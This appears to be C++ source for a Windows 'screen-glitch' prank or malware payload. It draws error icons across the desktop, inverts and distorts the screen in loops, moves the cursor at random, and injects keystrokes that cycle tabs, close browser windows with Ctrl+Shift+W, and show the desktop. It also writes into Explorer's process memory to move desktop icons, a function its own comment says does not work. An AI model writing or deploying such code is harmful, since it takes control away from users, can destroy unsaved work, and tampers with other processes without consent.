#include "Include.h"

HCRYPTPROV prov;
int Random(void) {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, 
			NULL, NULL, PROV_RSA_FULL, 
			CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);
	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}	


void DrawIcons(int scrw, int scrh) {
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	POINT cursor;
	GetCursorPos(&cursor);
	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
	DrawIcon(hdc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_WARNING));
	DrawIcon(hdc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_APPLICATION));
	DrawIcon(hdc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_ASTERISK));
	DrawIcon(hdc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_EXCLAMATION));
	ReleaseDC(hwnd, hdc);
}


void ScrMove(std::atomic<bool>& quit_flag) {
	HDC desktopDC = GetDC(0);
	const int scrx = GetSystemMetrics(SM_XVIRTUALSCREEN);
	const int scry = GetSystemMetrics(SM_YVIRTUALSCREEN);
	const int scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	const int scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	HDC screenshotDC = CreateCompatibleDC(desktopDC);
	HBITMAP screenshotBmp = CreateCompatibleBitmap(desktopDC, scrw, scrh);
	SelectObject(screenshotDC, screenshotBmp);
	int i = 0;
	while (!quit_flag) {
		DrawIcons(scrw, scrh);
		desktopDC = GetDC(0);
		PatBlt(desktopDC, scrx, scry, scrw, scrh, DSTINVERT);
		BitBlt(screenshotDC, scrx, scry, scrw, scrh, desktopDC, 0, 0, SRCCOPY);
		int rx = rand() % 1920;
		int ry = rand() % 1080;
		SetCursorPos(rx, ry);
		rx = rand() % 1920;
		ry = rand() % 1080;
		for (float angle = 3.1415926535 * 1.8; angle < 2 * 3.1415926535; angle += 3.1415926535 / 30) {
			float sinx = sinf(angle);
			float cosy = cosf(angle);
	
			for (int d = 0; d < 40 * 50; d += 50) {
				int _x = sinx * (d - 1) + rx;
				int _y = cosy * (d - 1) + ry;
				int targetX = sinx * d + rx;
				int targetY = cosy * d + ry;
				BitBlt(screenshotDC, targetX, targetY, 50, 50, screenshotDC, _x, _y, SRCCOPY);
				int x2 = (cosf(angle) * (scrx - 400) - sinf(angle) * (scry - 400) + scrx);
				int y2 = (sinf(angle) * (scrx - 400) - cosf(angle) * (scry - 400) + scrx);
				BitBlt(screenshotDC, 500, 0, x2, y2, screenshotDC, _x, _y, SRCCOPY);
				BitBlt(screenshotDC, 1000, 0, x2, y2, screenshotDC, _x, _y, SRCCOPY);
				BitBlt(screenshotDC, 1500, 1000, x2, y2, screenshotDC, _x, _y, SRCCOPY);
				BitBlt(screenshotDC, 2000, 1000, x2, y2, screenshotDC, _x, _y, SRCCOPY);
			}
			i++;
			if(i % 5 == 0)
			PatBlt(desktopDC, scrx, scry, scrw, scrh, DSTINVERT);
			StretchBlt(desktopDC, 0, 0, scrw, scrh, screenshotDC, scrx + 10, scry + 10, scrw, scrh, SRCCOPY);
			StretchBlt(desktopDC, 0, 0, scrw, scrh, screenshotDC, scrx - 15, scry - 15, scrw, scrh, SRCCOPY);
			INPUT ip;
			ip.type = INPUT_KEYBOARD;
			ip.ki.wScan = 0;
			ip.ki.time = 0;
			ip.ki.dwExtraInfo = 0;
			ip.ki.wVk = VK_CONTROL;
			ip.ki.dwFlags = 0;
			SendInput(1, &ip, sizeof(INPUT));
			ip.ki.wVk = VK_TAB;
			SendInput(1, &ip, sizeof(INPUT));
			ip.ki.wVk = VK_TAB;
			ip.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &ip, sizeof(INPUT));
			ip.ki.wVk = VK_CONTROL;
			SendInput(1, &ip, sizeof(INPUT));
		}
		Sleep(1000);
	}
	INPUT ip;
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;
	ip.ki.wVk = VK_CONTROL;
	ip.ki.dwFlags = 0;
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.wVk = VK_LSHIFT;
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.wVk = 0x57;
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.wVk = 0x57;
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.wVk = VK_CONTROL;
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.wVk = VK_LSHIFT;
	SendInput(1, &ip, sizeof(INPUT));
}

#define randx rand() % 1920
#define randy rand() % 1080

void Glitch(void) {
	HDC ddc = GetDC(0);
	HDC sdc = CreateCompatibleDC(ddc);

	const int scrx = GetSystemMetrics(SM_XVIRTUALSCREEN);
	const int scry = GetSystemMetrics(SM_YVIRTUALSCREEN);
	const int scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	const int scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

	HBITMAP sbmp = CreateCompatibleBitmap(ddc, scrw, scrh);
	SelectObject(sdc, sbmp);

	for (int _____i = 0; _____i < 10; _____i++) {
		ddc = GetDC(0);
		PatBlt(ddc, scrx, scry, scrw, scrh, SRCINVERT);
		BitBlt(sdc, scrx, scry, scrw, scrh, ddc, 0, 0, SRCCOPY);

		SetCursorPos(randx, randy);

		for (float angle = 3.1415926535 * 1.3; angle < 2 * 3.1415926535; angle += 3.1415926535 / 300 * 4) {
			float sinx = sinf(angle);
			float cosy = cosf(angle);
			for (int d = 0; d < 40 * 50; d += 50) {
				int _x = sinx * (d - 1) + randx;
				int _y = cosy * (d - 1) + randy;
				int targetX = sinx * d + randx;
				int targetY = cosy * d + randy;
				BitBlt(sdc, targetX, targetY, 200, 200, sdc, _x, _y, SRCCOPY);
			}
			BitBlt(ddc, 0, 0, scrw, scrh, sdc, scrx, scry, SRCCOPY);
			StretchBlt(ddc, -10, -10, scrw - 10, scrh - 10, sdc, 30, 30, scrw - 10, scrh - 10, SRCCOPY);
		}
		Sleep(5);
	}
}


void GTDesktop(void) {
	INPUT ip;
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;
	ip.ki.wVk = VK_LWIN;
	ip.ki.dwFlags = 0; 
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.wVk = 0x44;
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.wVk = 0x44;
	ip.ki.dwFlags = KEYEVENTF_KEYUP; 
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.wVk = VK_LWIN;
	SendInput(1, &ip, sizeof(INPUT));
}

/* doesnt work! try registry HKCU\Software\Microsoft\Windows\Shell\Bags\1\Desktop\IconLayouts */
void DShuffle(void) {
	HWND hd;
	HANDLE he;
	DWORD pi;

	hd = FindWindowA("Progman", NULL);
	hd = FindWindowEx(hd, 0, L"WorkerW", NULL);
	if (!hd)
		ExitProcess(100);
	hd = FindWindowEx(hd, 0, L"SysListView32", NULL);
	if (!hd)
		ExitProcess(1000);
	GetWindowThreadProcessId(hd, &pi);
	he = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, pi);
	POINT *pc = (POINT*)VirtualAllocEx(he, NULL, sizeof(POINT), MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(he, pc, &pc, sizeof(POINT), NULL);
	for (int i = 0; i < 100; i++) {
		ListView_SetItemPosition(hd, 0, i, i);
		Sleep(10);
	}
	VirtualFreeEx(he, pc, 0, MEM_RELEASE);
} 